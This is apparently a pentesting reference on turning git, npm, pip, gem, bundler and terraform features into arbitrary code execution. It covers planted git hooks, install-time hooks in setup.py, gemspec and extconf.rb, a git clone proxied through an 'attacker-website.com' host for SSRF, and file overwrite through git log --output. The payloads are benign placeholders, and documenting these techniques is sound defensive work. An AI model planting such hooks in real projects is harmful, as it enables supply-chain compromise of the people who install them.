# git

## Abusing bare repositories

You can use bare repositories to deliver custom git hooks and execute arbitrary code. For instance, if the vulnerable code executes the following bash commands:

```bash
$ git clone -- "<REPO>" "target_directory"
$ cd "target_directory"
$ git checkout "subproject"
```

You can create a repo with the `subproject` folder, which is a bare repository with a payload in the post checkout hook:

```bash
$ git clone "<REPO>" target_directory
$ cd target_directory
$ mkdir subproject
$ cd subproject
$ git init --bare
$ echo "#!/bin/sh" > hooks/post-checkout
$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
$ # commit and push
```

## git-clone

{% raw %} {% embed url="https://git-scm.com/docs/git-clone" %} {% endraw %}

### --config

Set a configuration variable in the newly-created repository; this takes effect immediately after the repository is initialized, but before the remote history is fetched or any files checked out.

#### core.hooksPath

`core.hooksPath` sets different path to hooks. You can create the post checkout hook within a repository, set the path to hooks with the `hooksPath`, and execute arbitrary code.

```bash
$ git clone "<REPO>" target_directory
$ cd target_directory
$ mkdir hooks
$ echo "#!/bin/sh" > hooks/post-checkout
$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
$ # commit and push
```

To execute the payload, run the git-clone:

```bash
$ git clone -c core.hooksPath=hooks "<REPO>"
```

- [git-config docs: core.hooksPath](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)
- [githooks docs](https://git-scm.com/docs/githooks)

#### http.proxy and http.&lt;URL&gt;.proxy

`http.proxy` or `http.<URL>.proxy` override the HTTP proxy. You can use this to get SSRF:

```bash
$ git clone -c http.proxy=http://attacker-website.com -- "<REPO>" target_directory
$ git clone -c http.http://website.com/.proxy=http://attacker-website.com -- "<REPO>" target_directory
```

Pay attention to other `http.*` configs and `remote.<name>.proxy`, they can help to increase the impact.

- [git-config docs: remote.<name>.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-remoteltnamegtproxy)

### &lt;directory&gt;

git-clone allows you to specify a new directory to clone into. Cloning into an existing directory is only allowed if the directory is empty. You can use this to write a repo outside a default folder.

```bash
$ git clone -- "<REPO>" target_directory
```

## git-log

{% raw %} {% embed url="https://git-scm.com/docs/git-log" %} {% endraw %}

### --output

`output` definea a specific file to output instead of stdout. You can use this to rewrite arbitrary files.

```bash
$ git log --output=/tmp/arbitrary_file
$ cat /tmp/arbitrary_file
commit c79538fb19b1d9d21bf26e9ad30fdeb90be1eaf0
Author: User <user@local>

## git-grep

{% raw %} {% embed url="https://git-scm.com/docs/git-grep" %} {% endraw %}

### --no-index

`no-index` tells the git-grep to search files in the current directory that is not managed by Git. In other words, if a working directory is different from a repository one `no-index` allows you to get access to files in the working directiory.

# npm scripts

The [scripts](https://docs.npmjs.com/cli/v7/using-npm/scripts) property of the `package.json` file supports a number of built-in scripts and their preset life cycle events as well as arbitrary scripts. These all can be executed using [npm run-script or npm run for short](https://docs.npmjs.com/cli/v7/commands/npm-run-script). 

{% raw %} {% hint style="info" %} {% endraw %}
Scripts from dependencies can be run with `npm explore <pkg> -- npm run <stage>`
{% raw %} {% endhint %} {% endraw %}

Pre and post commands with matching names will be run for those as well (e.g. premyscript, myscript, postmyscript). To create pre or post scripts for any scripts defined in the `scripts` section of the `package.json`, simply create another script with a matching name and add `pre` or `post` to the beginning of them.

In the following example `npm run compress` would execute these scripts as described.

```json
{
  "scripts": {
    "precompress": "{{ executes BEFORE the `compress` script }}",
    "compress": "{{ run command to compress files }}",
    "postcompress": "{{ executes AFTER `compress` script }}"
  }
}
```

There are some special life cycle scripts that happen only in certain situations. These scripts happen in addition to the `pre<event>`, `post<event>`, and `<event>` scripts.

- `prepare` (since npm@4.0.0)
    - Runs any time before the package is packed, i.e. during `npm publish` and `npm pack`
    - Runs BEFORE the package is packed
    - Runs BEFORE the package is published
    - Runs on local `npm install` without any arguments
    - Run AFTER `prepublish`, but BEFORE `prepublishOnly`
    - NOTE: If a package being installed through git contains a `prepare` script, its `dependencies` and `devDependencies` will be installed, and the prepare script will be run, before the package is packaged and installed
    - As of `npm@7` these scripts run in the background. To see the output, run with: `--foreground-scripts`
- `prepublish` ([DEPRECATED](https://docs.npmjs.com/cli/v7/using-npm/scripts#prepare-and-prepublish))
    - Does not run during `npm publish`, but does run during `npm ci` and `npm install`
- `prepublishOnly`
    - Runs BEFORE the package is prepared and packed, ONLY on `npm publish`
- `prepack`
    - Runs BEFORE a tarball is packed (on `npm pack`, `npm publish`, and when installing a git dependencies)
    - NOTE: `npm run pack` is NOT the same as `npm pack`. `npm run pack` is an arbitrary user defined script name, where as, `npm pack` is a CLI defined command
- `postpack`
    - Runs AFTER the tarball has been generated but before it is moved to its final destination (if at all, publish does not save the tarball locally)

## npm cache add

[npm cache add](https://docs.npmjs.com/cli/v7/commands/npm-cache) runs the following life cycle scripts:

- `prepare`

## npm ci

[npm ci](https://docs.npmjs.com/cli/v7/commands/npm-ci) runs the following life cycle scripts:

- `preinstall`
- `install`
- `postinstall`
- `prepublish`
- `preprepare`
- `prepare`
- `postprepare`

These all run after the actual installation of modules into `node_modules`, in order, with no internal actions happening in between.

## npm diff

[npm diff](https://docs.npmjs.com/cli/v7/commands/npm-diff) runs the following life cycle scripts:

- `prepare`

## npm install

[npm install](https://docs.npmjs.com/cli/v7/commands/npm-install) runs the following life cycle scripts (also run when you run `npm install -g <pkg-name>`):

- `preinstall`
- `install`
- `postinstall`
- `prepublish`
- `preprepare`
- `prepare`
- `postprepare`

If there is a `binding.gyp` file in the root of a package and install or preinstall scripts were not defined, `npm` will default the `install` command to compile using [node-gyp](https://www.npmjs.com/package/node-gyp) via `node-gyp rebuild`.

## npm pack

[npm pack](https://docs.npmjs.com/cli/v7/commands/npm-pack) runs the following life cycle scripts:

- `prepack`
- `prepare`
- `postpack`

## npm publish

[npm publish](https://docs.npmjs.com/cli/v7/commands/npm-publish) runs the following life cycle scripts:

- `prepublishOnly`
- `prepack`
- `prepare`
- `postpack`
- `publish`
- `postpublish`

`prepare` will not run during `--dry-run`

## npm rebuild

[npm rebuild](https://docs.npmjs.com/cli/v7/commands/npm-rebuild) runs the following life cycle scripts:

- `preinstall`
- `install`
- `postinstall`
- `prepare`

`prepare` is only run if the current directory is a symlink (e.g. with linked packages)

## npm restart

[npm restart](https://docs.npmjs.com/cli/v7/commands/npm-restart) runs a restart script if it was defined, otherwise stop and start are both run if present, including their pre and post iterations):

- `prerestart`
- `restart`
- `postrestart`

## npm start

[npm start](https://docs.npmjs.com/cli/v7/commands/npm-start) runs the following life cycle scripts:

- `prestart`
- `start`
- `poststart`

If there is a `server.js` file in the root of your package, then `npm` will default the start command to node `server.js`. `prestart` and `poststart` will still run in this case.

## npm stop

[npm stop](https://docs.npmjs.com/cli/v7/commands/npm-stop) runs the following life cycle scripts:

- `prestop`
- `stop`
- `poststop`

## npm test

[npm test](https://docs.npmjs.com/cli/v7/commands/npm-test) runs the following life cycle scripts:

- `pretest`
- `test`
- `posttest`

# pip

## pip install

Extending the `setuptools` modules allows you to hook almost any `pip` command. For instance, you can use the `install` class within `setup.py` file to execute an arbitrary code during `pip install` running. 

```python
from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        # Insert code here
        install.run(self)

setup(
    ...
    cmdclass={
        'install': PostInstallCommand,
    },
    ...
)
```

When `pip install` is run the `PostInstallCommand.run` method will be invoked.

# gem

## gem build

`gemspec` file is a ruby file that defines what is in the gem, who made it, and the version of the gem. Since it is a ruby file you can write arbitrary code that will be executed when running `gem build`.

```ruby
# hola.gemspec file

# arbitrary code here
system('echo "hola!"')

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
end
```

When `gem build` is run the arbitrary ruby code will be executed.

```bash
$ gem build hola.gemspec
hola!
  Successfully built RubyGem
  Name: hola
  Version: 0.0.0
  File: hola-0.0.0.gem
```

- [RubyGames Guides: Command reference - gem build](https://guides.rubygems.org/command-reference/#gem-build)

## gem install

### Extensions

`gemspec` allows you to define extensions to build when installing a gem. Many gems use extensions to wrap libraries that are written in C with a ruby wrapper. `gem` uses the `extconf.rb` to build an extension during installation. Since it is a ruby file you can write arbitrary code that will be executed when running `gem install`.

```ruby
# hola.gemspec file

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
  s.extensions  = 'extconf.rb'
end
```

```ruby
# extconf.rb

# arbitrary code here
system('echo "hola!"')
```

```bash
$ gem build hola.gemspec
  Successfully built RubyGem
  Name: hola
  Version: 0.0.0
  File: hola-0.0.0.gem
```

When `gem install` is run the arbitrary ruby code will be executed.

```bash
$ gem install ./hola-0.0.0.gem
Building native extensions. This could take a while...
ERROR:  Error installing hola-0.0.0.gem:
        ERROR: Failed to build gem native extension.
...
hola!
...
```

# bundler

## bundler install

[bundler install](https://bundler.io/v2.2/man/bundle-install.1.html) uses `gem` under the hood, therefore, it is possible to reuse gem's features for giving a profit.

### Gemfile

[Gemfile](https://bundler.io/v2.2/man/gemfile.5.html) describes the gem dependencies required to execute associated Ruby code. Since it is a ruby file you can write arbitrary code that will be executed when running `bundle install`.

```ruby
# Gemfile

# arbitrary code here
system('echo "hola!"')
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ bundle install
hola!
hola!
The Gemfile specifies no dependencies
Resolving dependencies...
Bundle complete! 0 Gemfile dependencies, 1 gem now installed.
```

### gem dependency

Since `bundler` uses `gem install` to install the specified dependencies in `Gemfile` you can use extensions to embed an arbitrary code.

```ruby
# hola.gemspec file

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
  s.extensions  = 'extconf.rb'
end
```

```ruby
# extconf.rb

# arbitrary code here
system('echo "hola!"')
```

```bash
# build and push to rubygems.org
$ gem build hola.gemspec
$ gem push ./hola-0.0.0.gem
```

```ruby
# Gemfile

source 'https://rubygems.org'

gem 'hola'
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ gem install ./hola-0.0.0.gem
Building native extensions. This could take a while...
ERROR:  Error installing hola-0.0.0.gem:
        ERROR: Failed to build gem native extension.
...
hola!
...
```

### git dependency

One of the sources of gems for `bundler` are git repositories with a gem's source code. Since a git repositories contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.

{% raw %} {% hint style="info" %} {% endraw %}
You can execute an arbitrary code using both [gemspec](#gem-build) file and [native extensions](#extensions)
{% raw %} {% endhint %} {% endraw %}

Create a repository on `github.com` with the following `hola.gemspec` file:

```ruby
# arbitrary code here
system('echo "hola!"')

Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = []
  s.homepage    = 'https://rubygems.org/gems/hola'
  s.license     = 'MIT'
end
```

Add the repository to `Gemfile` as a git dependency.

```ruby
# Gemfile
gem 'hola', :git => 'https://github.com/username/hola'
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ bundle install
Fetching https://github.com/username/hola
hola!
Resolving dependencies...
Using bundler 2.2.21
Using hola 0.0.0 from https://github.com/username/hola (at main@4a4a4ee)
Bundle complete! 1 Gemfile dependency, 2 gems now installed.
```

- [Bundler Docs: gemfile - Git](https://bundler.io/v1.16/gemfile_man.html#GIT)

### path dependency

You can specify that a gem is located in a particular location on the file system. Relative paths are resolved relative to the directory containing the `Gemfile`. Since a git repositories contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.

You can specify that a gem is located in a particular location on the file system. Relative paths are resolved relative to the directory containing the `Gemfile`.

Similar to the semantics of the `:git` option, the `:path` option requires that the directory in question either contains a `.gemspec` for the gem, or that you specify an explicit version that bundler should use.

{% raw %} {% hint style="info" %} {% endraw %}
Unlike `:git`, `bundler` does not compile native extensions for gems specified as paths
{% raw %} {% endhint %} {% endraw %}

Therefore, you can gain code execution using the [.gemspec file with an arbitrary code](#gem-build) or [built gem with native extension](#extensions).

```ruby
# Gemfile
# .gemspec file is located in vendor/hola 
gem 'hola', :path => "vendor/hola"
```

```ruby
# Gemfile
# vendor/hola contains hola-0.0.0.gem file
gem 'hola', '0.0.0', :path => "vendor/hola"
```

When `bundle install` is run the arbitrary ruby code will be executed.

```bash
$ bundle install
hola!
Resolving dependencies...
Using hola 0.0.0 from source at `vendor/hola`
Using bundler 2.2.21
Bundle complete! 1 Gemfile dependency, 2 gems now installed.
```

# terraform

## terraform-plan

Terraform relies on plugins called ["providers"](https://www.terraform.io/docs/language/providers/configuration.html) to interact with remote systems. Terraform configurations must declare which providers they require, so that Terraform can install and use them. 

You can write a [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup), publish it to the [Terraform Registry](https://registry.terraform.io/) and add the provider to the Terraform code.

```tf
terraform {
  required_providers {
    evil = {
      source  = "evil/evil"
      version = "1.0"
    }
  }
}

provider "evil" {}
```

```bash
$ terraform init
$ terraform plan
```

The provider will be pulled in during `terraform init` and when `terraform plan` is run the arbitrary ruby code will be executed.

Additionally, Terraform offers the [external provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) which provides a way to interface between Terraform and external programs. Therefore, you to use the `external` data source to run arbitrary code. The following example from [docs](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) executes a python script during `terraform plan`.

```tf
data "external" "example" {
  program = ["python", "${path.module}/example-data-source.py"]

  query = {
    # arbitrary map from strings to strings, passed
    # to the external program as the data query.
    id = "abc123"
  }
}
```
